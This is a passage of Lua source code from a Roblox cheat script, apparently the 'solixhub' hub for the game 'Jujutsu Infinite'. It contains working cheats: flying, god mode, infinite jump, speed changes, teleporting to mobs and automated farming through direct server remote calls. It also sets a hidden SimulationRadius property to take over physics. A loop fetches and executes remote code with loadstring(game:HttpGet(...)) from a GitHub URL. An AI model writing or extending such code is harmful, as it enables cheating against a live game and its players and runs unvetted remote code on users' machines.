			local track = char.Humanoid:LoadAnimation(anim)
			track.Looped = looped
			return track
		end

		local function PlayAnimation()
			if not type8.GoonList["Relix"] then
				type8.GoonList["Relix"] = LoadAnimation("rbxassetid://168268306", false)
			end
			if not type8.GoonList["Lilix123"] then
				type8.GoonList["Lilix123"] = LoadAnimation("rbxassetid://72042024", true)
			end
			if type8.GoonList["Relix"] then 
				type8.GoonList["Relix"]:Play() 
			end
			if type8.GoonList["Lilix123"] then 
				type8.GoonList["Lilix123"]:Play() 
			end
		end

		if value then
			PlayAnimation()
		else
			if HasCooldown("AlreadyLoaded") then
				wait(0.1)
				if type8.GoonList["Relix"] then 
					type8.GoonList["Relix"]:Stop() 
				end
				if type8.GoonList["Lilix123"] then
					type8.GoonList["Lilix123"]:Stop() 
				end
				type8.GoonList["Relix"] = nil
				type8.GoonList["Lilix123"] = nil
			end

			if not type8.GoonList["Infinite Goon"] then
				type8.GoonList["Infinite Goon"] = plr.CharacterAdded:Connect(function()
					wait(0.5)
					if value then
						PlayAnimation()
					end
				end)
			end
		end
	end
})

Misc2_Section:Button():Add("Rain Fruit", function()
	for i, v in pairs(game:GetObjects("rbxassetid://14759368201")[1]:GetChildren()) do
		v.Parent = Workspace
		v:MoveTo(char.PrimaryPart.Position + Vector3.new(math.random(-50, 50), 100, math.random(-50, 50)))

		v.Handle.Touched:Connect(function(p)
			if p.Parent == char then
				v.Parent = plr.Backpack
				char.Humanoid:EquipTool(v)
			end
		end)
	end
end)

local Fly_Section = Pages["Misc"]:Section({ Name = "Fly Settings", Side = 2 })

Fly_Section:Toggle({
	Name = "Fly Toggle",
	Flag = "Fly Toggle",
	Description = "",
	Tooltip = "Can fly when turned on",
	Default = false,
	Disabled = not IsWorld,
	Callback = function(value)
		Library.Flags["Fly Toggle"] = value

		if value then
			if not IsActive(char) then return end

			local relix = Instance.new("BodyVelocity")
			relix.Name = "VelocityHandler"
			relix.MaxForce = Vector3.new(9e9, 9e9, 9e9)
			relix.Velocity = Vector3.zero
			relix.Parent = char.HumanoidRootPart

			local lilix = Instance.new("BodyGyro")
			lilix.Name = "GyroHandler"
			lilix.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
			lilix.P = 1000
			lilix.D = 50
			lilix.Parent = char.HumanoidRootPart

			char.Humanoid.PlatformStand = true

			if IsMobile then
				type8.FlyList["Mobile Toggle"] = RunService.RenderStepped:Connect(function()
					if not Library.Flags["Fly Toggle"] or not IsActive(char) then return end

					local control = GetPath(plr, "PlayerScripts", "PlayerModule", "ControlModule")
						and require(GetPath(plr, "PlayerScripts", "PlayerModule", "ControlModule")):GetMoveVector()

					if control and control.Magnitude > 0 then
						relix.Velocity = (Camera.CFrame.LookVector * -control.Z + Camera.CFrame.RightVector * control.X) * (Library.Flags["Fly Speed"] or 50)
					else
						relix.Velocity = Vector3.zero
					end
					lilix.CFrame = Camera.CFrame
				end)
			else
				local key = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}

				type8.FlyList["Key Down"] = UserInputService.InputBegan:Connect(function(input, processed)
					if processed then return end

					if input.KeyCode == Enum.KeyCode.W then key.F = 1
					elseif input.KeyCode == Enum.KeyCode.S then key.B = -1
					elseif input.KeyCode == Enum.KeyCode.A then key.L = -1
					elseif input.KeyCode == Enum.KeyCode.D then key.R = 1
					elseif input.KeyCode == Enum.KeyCode.E then key.Q = 1
					elseif input.KeyCode == Enum.KeyCode.Q then key.E = -1
					end
				end)

				type8.FlyList["Key Up"] = UserInputService.InputEnded:Connect(function(input)
					if input.KeyCode == Enum.KeyCode.W then key.F = 0
					elseif input.KeyCode == Enum.KeyCode.S then key.B = 0
					elseif input.KeyCode == Enum.KeyCode.A then key.L = 0
					elseif input.KeyCode == Enum.KeyCode.D then key.R = 0
					elseif input.KeyCode == Enum.KeyCode.E then key.Q = 0
					elseif input.KeyCode == Enum.KeyCode.Q then key.E = 0
					end
				end)

				type8.FlyList["PC Toggle"] = RunService.RenderStepped:Connect(function()
					if not Library.Flags["Fly Toggle"] or not IsActive(char) then return end

					local vector = Vector3.new()
					vector += Camera.CFrame.LookVector * (key.F + key.B)
					vector += Camera.CFrame.RightVector * (key.R + key.L)
					vector += Vector3.new(0, key.Q + key.E, 0)

					if vector.Magnitude > 0 then
						relix.Velocity = vector.Unit * (Library.Flags["Fly Speed"] or 50)
					else
						relix.Velocity = Vector3.zero
					end
					lilix.CFrame = Camera.CFrame
				end)
			end

		else
			if HasCooldown("AlreadyLoaded") then
				wait(0.1)
				if IsActive(char) then
					for k, v in pairs(type8.FlyList) do
						if typeof(v) == "RBXScriptConnection" then
							v:Disconnect()
						end
						type8.FlyList[k] = nil
					end

					char.Humanoid.PlatformStand = false
					for _, v in pairs(char.HumanoidRootPart:GetChildren()) do
						if v:IsA("BodyGyro") or v:IsA("BodyVelocity") then
							v:Destroy()
						end
					end
				end
			end
		end
	end
})

Fly_Section:Slider({
	Name = "Fly Speed",
	Flag = "Fly Speed",
	Description = "",
	Default = 50,
	Min = 10,
	Max = 500,
	Decimals = 1,
	Suffix = "",
	Disabled = not IsWorld,
	Callback = function(value)
		Library.Flags["Fly Speed"] = value
	end
})

local Player_Section = Pages["Misc"]:Section({ Name = "Player Settings", Side = 2 })

Player_Section:Toggle({
	Name = "Infinite Jump",
	Flag = "Infinite Jump",
	Description = "",
	Tooltip = "Allows infinite jumping when Jump",
	Default = false,
	Callback = function(value)
		Library.Flags["Infinite Jump"] = value  

		if value then
			getgenv()["Infinite Jump"] = UserInputService.InputBegan:Connect(function(input, processed)
				if not processed and input.KeyCode == Enum.KeyCode.Space then
					if IsActive(char) then
						char.Humanoid:ChangeState(3)
					end
				end
			end)
		else
			if HasCooldown("AlreadyLoaded") then
				wait(0.1)
				if getgenv()["Infinite Jump"] then
					getgenv()["Infinite Jump"]:Disconnect()
					getgenv()["Infinite Jump"] = nil
				end
			end
		end
	end
})

Player_Section:Slider({
	Name = "Walk Speed",
	Flag = "Walk Speed",
	Description = "",
	Default = 50,
	Min = 0,
	Max = 300,
	Decimals = 10,
	Suffix = "",
	Callback = function(value)
		if not IsActive(char) then return end

		Library.Flags["Walk Speed"] = value
		char.Humanoid.WalkSpeed = value
	end
})

Player_Section:Slider({
	Name = "Jump Power",
	Flag = "Jump Power",
	Description = "",
	Default = 50,
	Min = 0,
	Max = 300,
	Decimals = 10,
	Suffix = "",
	Callback = function(value)
		if not IsActive(char) then return end

		Library.Flags["Jump Power"] = value
		char.Humanoid.JumpPower = value
	end
})

local Server_Section = Pages["Misc"]:Section({ Name = "Server Settings", Side = 2 })

Server_Section:Dropdown({
	Name = "Select Method",
	Flag = "Select Method to Hop",
	Description = "",
	Items = {"Normal Population", "Low Population"},
	Default = "Normal Population",
	Callback = function(value)
		Library.Flags["Select Method to Hop"] = value
	end
})

local Server_Button = Server_Section:Button()

Server_Button:Add("Hop Server", function()
	Hop(Library.Flags["Select Method to Hop"])
end)

Server_Button:Add("Rejoin Server", function()
	Library:Notification({
		Name = "Info",
		Description = "Rejoining the current server...",
		Duration = 5
	})

	local success, err = pcall(function()
		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
	end)

	if not success then
		Library:Notification({
			Name = "Error",
			Description = "Failed to rejoin server: " .. tostring(err),
			Duration = 8
		})
	end
end)

local FPS_Section = Pages["Misc"]:Section({ Name = "FPS Settings", Side = 2 })

FPS_Section:Toggle({
	Name = "Super Boost FPS",
	Flag = "Super Boost FPS",
	Description = "",
	Tooltip = "Remove map, textures, particles and lighting",
	Default = false,
	Callback = function(value)
		Library.Flags["Super Boost FPS"] = value

		if value then
			pcall(function()
				settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

				local user = UserSettings():GetService("UserGameSettings")
				user.SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
				user.GraphicsQualityLevel = 1
			end)

			Lighting.GlobalShadows = false
			Lighting.FogEnd = 9e9
			Lighting.Brightness = 0
			Lighting.EnvironmentDiffuseScale = 0
			Lighting.EnvironmentSpecularScale = 0
			Lighting.Ambient = Color3.new(1, 1, 1)
			Lighting.OutdoorAmbient = Color3.new(1, 1, 1)

			pcall(function()
				Lighting.Technology = Enum.Technology.Compatibility
			end)

			for _, effect in ipairs(Lighting:GetChildren()) do
				if effect:IsA("PostEffect") or effect:IsA("Sky") or effect:IsA("Atmosphere") then
					pcall(function()
						effect.Parent = nil
					end)
				end
			end

			pcall(function()
				Workspace.CurrentCamera.FieldOfView = 70
			end)

			pcall(function()
				Workspace.Terrain.Decoration = false
				Workspace.Terrain.WaterWaveSize = 0
				Workspace.Terrain.WaterWaveSpeed = 0
				Workspace.Terrain.WaterReflectance = 0
				Workspace.Terrain.WaterTransparency = 1
			end)

			pcall(function()
				if Workspace:FindFirstChild("StreamingEnabled") then
					Workspace.StreamingEnabled = true
					Workspace.StreamingMinRadius = 32
					Workspace.StreamingTargetRadius = 64
				end
			end)

			for _, v in ipairs(Workspace:GetDescendants()) do
				task.spawn(function()
					pcall(OptimizeObject, v)
				end)
			end

			InsertConnections(Workspace.DescendantAdded:Connect(function(v)
				task.spawn(function()
					pcall(OptimizeObject, v)
				end)
			end))

			InsertTasks(spawn(function()
				while Library.Flags["Super Boost FPS"] do
					pcall(function()
						collectgarbage("collect")
					end)
					wait(10)
				end
			end))

			pcall(function()
				if char and char:FindFirstChild("Animate") then
					char.Animate.Disabled = true
				end
			end)
		else
			pcall(function()
				settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic

				local user = UserSettings():GetService("UserGameSettings")
				user.SavedQualityLevel = Enum.SavedQualitySetting.Automatic
			end)
		end
	end
})

FPS_Section:Toggle({
	Name = "Black Screen",
	Flag = "Black Screen",
	Description = "",
	Tooltip = "Just a black screen",
	Default = false,
	Callback = function(value)

		if value then
			RunService:Set3dRenderingEnabled(false)

			if not type8.BlackScreen then
				local BlackScreen = Instance.new("ScreenGui")
				BlackScreen.Name = ""
				BlackScreen.IgnoreGuiInset = true
				BlackScreen.ResetOnSpawn = false
				BlackScreen.DisplayOrder = -1
				BlackScreen.Enabled = true
				BlackScreen.Parent = PlayerGUI
				type8.BlackScreen = BlackScreen

				local Frame = Instance.new("Frame")
				Frame.Name = ""
				Frame.Size = UDim2.new(1, 0, 1, 0)
				Frame.BackgroundColor3 = Color3.new(0, 0, 0)
				Frame.BorderSizePixel = 0
				Frame.Parent = BlackScreen
				type8.BlackFrame = Frame

				local Toogle = Instance.new("Frame")
				Toogle.Name = ""
				Toogle.BackgroundTransparency = 1
				Toogle.Size = UDim2.new(1, 0, 1, 0)
				Toogle.Parent = BlackScreen

				local Button = Instance.new("TextButton")
				Button.Name = ""
				Button.Size = UDim2.new(0, 160, 0, 40)
				Button.Position = UDim2.new(0.5, 0, 1, -300)
				Button.AnchorPoint = Vector2.new(0.5, 0)
				Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
				Button.TextColor3 = Color3.new(1, 1, 1)
				Button.Font = Enum.Font.SourceSansSemibold
				Button.TextSize = 19
				Button.Text = "Toggle Black Screen"
				Button.AutoButtonColor = true
				Button.BorderSizePixel = 0
				Button.Parent = Toogle

				local UIScale = Instance.new("UIScale")
				UIScale.Scale = 1
				UIScale.Parent = Button

				InsertConnections(Button.MouseButton1Click:Connect(function()
					if type8.BlackFrame then
						type8.BlackFrame.Visible = not type8.BlackFrame.Visible
						RunService:Set3dRenderingEnabled(not type8.BlackFrame.Visible)
					end
				end))
			end
		else
			if HasCooldown("AlreadyLoaded") then
				wait(0.1)
				RunService:Set3dRenderingEnabled(true)
				if type8.BlackScreen then
					type8.BlackScreen:Destroy()
					type8.BlackScreen = nil
					type8.BlackFrame = nil
				end
			end
		end
	end
})

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local Webhook_Section = {}

for _, mode in ipairs({"Item", "Cash Market", "Boss", "Investigation", "Calamity"}) do

	Webhook_Section[mode] = Pages["Webhook"]:Section({ Name = "Auto Send Webhook [" .. mode .. "]", Side = 1 })

	Webhook_Section[mode]:Textbox({
		Name = "Webhook URL",
		Flag = "Webhook URL " .. mode,
		Description = "",
		Default = "",
		Placeholder = "Paste your webhook URL",
		Callback = function(value)
			Library.Flags["Webhook URL " .. mode] = value
		end
	})

	Webhook_Section[mode]:Textbox({
		Name = "Mention Option",
		Flag = "Mention Option " .. mode,
		Description = "",
		Default = "",
		Placeholder = "e.g. @everyone, @here",
		Callback = function(value)
			Library.Flags["Mention Option " .. mode] = value
		end
	})

	Webhook_Section[mode]:Toggle({
		Name = "Auto Send Webhook",
		Flag = "Auto Send Webhook " .. mode,
		Description = "",
		Tooltip = "Automatically send a webhook when the match end",
		Default = false,
		Callback = function(value)
			Library.Flags["Auto Send Webhook " .. mode] = value
		end
	})

	Webhook_Section[mode]:Button():Add("Test Webhook", function()
		local webhook_url = Library.Flags["Webhook URL " .. mode]

		local webhook_info = webhookUtil.createMessage({
			Url = webhook_url,
			username = "solixhub",
			content = "hi chat"
		})

		local ok, err = pcall(function() webhook_info.sendMessage() end)

		if ok then
			Library:Notification({
				Name = "Webhook",
				Description = "Webhook sent successfully!",
				Duration = 5
			})
		else
			Library:Notification({
				Name = "Webhook",
				Description = "Failed to send webhook: " .. tostring(err),
				Duration = 5
			})
		end
	end)
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local function UpdateInventory()
	type8.RewardList = {}

	for _, v in ipairs(plr.ReplicatedData.inventory:GetChildren()) do
		if v:IsA("NumberValue") then
			type8.RewardList[v.Name] = v.Value
		end
	end
end

local function GetInventory()
	local result, current = {}, {}

	for _, v in ipairs(plr.ReplicatedData.inventory:GetChildren()) do
		if v:IsA("NumberValue") then
			current[v.Name] = v.Value
		end
	end

	for name, amount in pairs(current) do
		local old_amount = type8.RewardList[name] or 0
		local gained_amount = amount - old_amount

		if gained_amount > 0 then
			table.insert(result, {
				Name = name,
				Gain = gained_amount,
				Total = amount
			})
		end
	end

	type8.RewardList = current
	return result
end

UpdateInventory()

InsertConnections(PlayerGUI.ReadyScreen:GetPropertyChangedSignal("Enabled"):Connect(function()
	wait(3)
	if not PlayerGUI.ReadyScreen.Enabled then return end
	wait(6)
	repeat wait(0.3) until GetChest() == nil and not PlayerGUI.Loot.Enabled

	if not HasCooldown("Send Webhook") then
		local inventory_items, reward_lines = GetInventory(), {}

		local webhook_url
		local mention_option
		local auto_send_webhook

		if IsBoss then
			webhook_url = Library.Flags["Webhook URL Boss"]
			mention_option = Library.Flags["Mention Option Boss"]
			auto_send_webhook = Library.Flags["Auto Send Webhook Boss"]
		elseif IsInvestigation then
			webhook_url = Library.Flags["Webhook URL Investigation"]
			mention_option = Library.Flags["Mention Option Investigation"]
			auto_send_webhook = Library.Flags["Auto Send Webhook Investigation"]
		elseif IsCalamity then 
			webhook_url = Library.Flags["Webhook URL Calamity"]
			mention_option = Library.Flags["Mention Option Calamity"]
			auto_send_webhook = Library.Flags["Auto Send Webhook Calamity"]
		end

		if (IsBoss or IsInvestigation or IsCalamity) and auto_send_webhook then
			local webhook_message = webhookUtil.createMessage({
				Url = webhook_url,
				username = "solixhub",
				content = mention_option
			})

			local embed = webhook_message.addEmbed("Jujutsu Infinite", math.random(0, 16777215), "")

			embed.addField("Name", "||" .. plr.Name .. " [" .. plr.ReplicatedData.level.Value .. "]||")

			embed.addField(
				"Match",
				"Map: " .. ReplicatedStorage.RoomType.Value .. "\n" ..
					"Difficulty: " .. ReplicatedStorage.Difficulty.Value .. "\n" ..
					"Level Tier: " .. ReplicatedStorage.LevelTier.Value .. "\n" ..
					"Server Age: " .. ToTime(ReplicatedStorage.ServerAge.Value)
			)

			if #inventory_items > 0 then
				table.sort(inventory_items, function(a, b)
					return tostring(a.Name) < tostring(b.Name)
				end)

				for _, v in ipairs(inventory_items) do
					table.insert(reward_lines, string.format("+ %d %s [%d]", v.Gain, v.Name, v.Total))
				end

				embed.addField("Reward", table.concat(reward_lines, "\n"))
			end

			pcall(function()
				webhook_message.sendMessage()
				AddCooldown("Send Webhook", 13)
			end)
		end
	end

	local action = IsBoss and Library.Flags["Select Action Boss to Teleport"] 
		or IsInvestigation and Library.Flags["Select Action Investigation to Teleport"]
		or IsCalamity and Library.Flags["Select Action Calamity to Teleport"]

	InsertTasks(spawn(function()
		while wait(0.3) do
			if not PlayerGUI.ReadyScreen.Enabled then return end
			ClickGui(PlayerGUI.ReadyScreen.Frame[action])
		end
	end))
end))

InsertConnections(PlayerGUI.AFKCheck:GetPropertyChangedSignal("Enabled"):Connect(function()
	SendKey(PlayerGUI.AFKCheck.Frame.Accept)
end))

InsertTasks(spawn(function()
	while wait(1) do
		local valid_library, _ = pcall(function() return getgenv().Library end)
		local valid_webhook, _ = pcall(function()
			return loadstring(game:HttpGet("https://raw.githubusercontent.com/meobeo8/Misc/a/Webhook.lua"))()
		end)

		if valid_library and valid_webhook and valid_library ~= nil and valid_webhook ~= nil then
			getgenv().HeHeHe = true
			AddCooldown("AlreadyLoaded")
			return
		end
	end
end))

InsertTasks(spawn(function()
	local chest, item, material, mob, enery = nil, nil, nil, nil, nil

	while wait() do
		local A, B = pcall(function()
			if not IsActive(char) then return end

			if char.HumanoidRootPart.Anchored then
				char.HumanoidRootPart.Anchored = false
			end

			if char:FindFirstChild("Humanoid") then
				char.Humanoid.WalkSpeed = Library.Flags["Walk Speed"]
				char.Humanoid.JumpPower = Library.Flags["Jump Power"]
			end 

			if Library.Flags["Auto Farm Nearest"] then
				type8.Nearest()
			end

			if Library.Flags["Auto Farm World"] and IsWorld then
				type8.World()
			end

			if Library.Flags["Auto Farm Mission"] and IsWorld then
				type8.Mission()
			end

			if Library.Flags["Auto Farm Storyline"] and IsWorld then
				type8.Storyline()
			end

			if Library.Flags["Auto Farm Daily"] and IsWorld then
				type8.Daily()
			end

			if Library.Flags["Auto Farm Boss"] and IsBoss then
				type8.Boss()
			end

			if Library.Flags["Auto Farm Investigation"] and IsInvestigation then
				type8.Investigation()
			end			

			if Library.Flags["Auto Farm Calamity"] and IsCalamity then
				type8.Calamity()			
			end

			if Library.Flags["Auto Join"] then
				type8.Join()
			end

			if Library.Flags["Auto Farm Exchange Event"] then
				ExchangeEvent()
			end

			if Library.Flags["God Mode"] then
				type8.GodMode()
			end

			if Library.Flags["Infinite Black Flash"] then
				type8.BlackFlash()
			end

			if Library.Flags["Infinite Can Domain"] then
				type8.CanDomain()
			end

			if Library.Flags["Auto Collect Chest"] then
				type8.Chest()
			end

			if Library.Flags["Auto Domain Clash"] then
				type8.DomainClash()
			end

			if Library.Flags["Auto Promote"] then
				type8.Promote()
			end

			if Library.Flags["Auto Collect Item"] and IsWorld then
				type8.CollectItem()
			end

			if Library.Flags["Auto Collect Material"] and IsWorld then
				type8.Material()
			end

			if Library.Flags["Auto Cash Market"] then
				type8.CashMarket()
			end

			if Library.Flags["Auto Use Item"] and not Library.Flags["Chest Use Only"] then
				type8.UseItem()
			end

			if Library.Flags["Auto Sell Item"] then
				type8.SellItem()
			end

			if Library.Flags["Auto Chat Buff"] then
				if not HasCooldown("Chat Buff") then
					AddCooldown("Chat Buff", Library.Flags["Chat After x Minutes"] * 60)
					TextChatService.TextChannels.RBXGeneral:SendAsync("/buff")
				end
			end

			if Library.Flags["Auto Chat Luck"] then
				if not HasCooldown("Chat Luck") then
					AddCooldown("Chat Luck", Library.Flags["Chat After x Minutes"] * 60)
					TextChatService.TextChannels.RBXGeneral:SendAsync("/luck")
				end
			end

			if Library.Flags["Auto Roll Innate"] and IsWorld then
				type8.RollInnate()
			end

			if (IsAfk and #Workspace.Objects.Portals:GetChildren() == 0) 
				or (IsTutorial and #Workspace.Objects.Portals:GetChildren() >= 1) then
				TeleportService:Teleport(10450270085)
				wait(36)
			end
		end)
		if not A then
			print(B)
		end
	end
end))

if IsTutorial then
	local skip = PlayerGUI.Blackbars.Skip
	local text = PlayerGUI.EventText.TutorialText
	local image = PlayerGUI.EventText.TutorialText.Frame.Frame.ImageLabel1
	local dialogue = PlayerGUI.StorylineDialogue.Frame.Dialogue.Response

	local list = {"Infinity: Lapse Blue", "Infinity: Reversal Red", "Infinity: Spatial Pummel", "Infinity: Mugen", "Infinity: Red Transmission", "Infinity: Hollow Purple"}

	InsertTasks(spawn(function()
		local mob = nil

		while wait(0.3) do
			local A, B = pcall(function()
				if not IsActive(char) then return end  

				type8.DomainClash()

				if skip.Visible then
					ClickGui(skip)
				end

				if not mob or not IsActive(mob) then
					mob = GetMob()
				end			

				if mob and IsActive(mob) then
					local h, r = mob.Humanoid, mob.HumanoidRootPart
					TP(r.CFrame * CFrame.new(0, 0, 3))

					if image.Image == "rbxassetid://18542801740" then
						for i = 1, 2 do
							SendKey(Enum.KeyCode.Space)                                                
						end

					elseif image.Image == "rbxassetid://18542801116" then
						type8.Server.Combat.Rush:FireServer(h, true) 
						wait(0.3)

					elseif image.Image == "rbxassetid://18542801335" then
						type8.M1(h)

					elseif image.Image == "rbxassetid://18542802386" then
						SendKey("Q")

					elseif image.Image == "rbxassetid://18977304452" then                      
						SendKey(Enum.KeyCode.LeftShift)

					elseif image.Image == "rbxassetid://18542803119" then
						type8.M2(2)

					elseif image.Image == "rbxassetid://18542800904" then
						if not HasCooldown("a") then
							AddCooldown("a", 36)
							type8.Skill:FireServer("Maximum: Six Eyes")
						end

					elseif image.Image == "rbxassetid://18542802894" then
						type8.Skill:FireServer("Infinity: Lapse Blue")

					elseif image.Image == "rbxassetid://18542802606" then
						type8.Skill:FireServer("Infinity: Reversal Red")

					elseif image.Image == "rbxassetid://18542802079" then
						type8.Skill:FireServer("Domain Expansion: Unlimited Void")
					end

					if text.Text == "Use your innate abilities" or dialogue.Text == "Let's get this over with." then
						for _, v in ipairs(list) do
							if not HasCooldown(v) then
								AddCooldown(v, math.random(3, 6))
								type8.Skill:FireServer(v)
								break
							end
						end
					end
				end
			end)
			if not A then
				print(B)
			end
		end
	end))
end

InsertConnections(RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
	sethiddenproperty(plr, "SimulationRadius", math.huge)
end)))

Library:CheckForAutoLoad()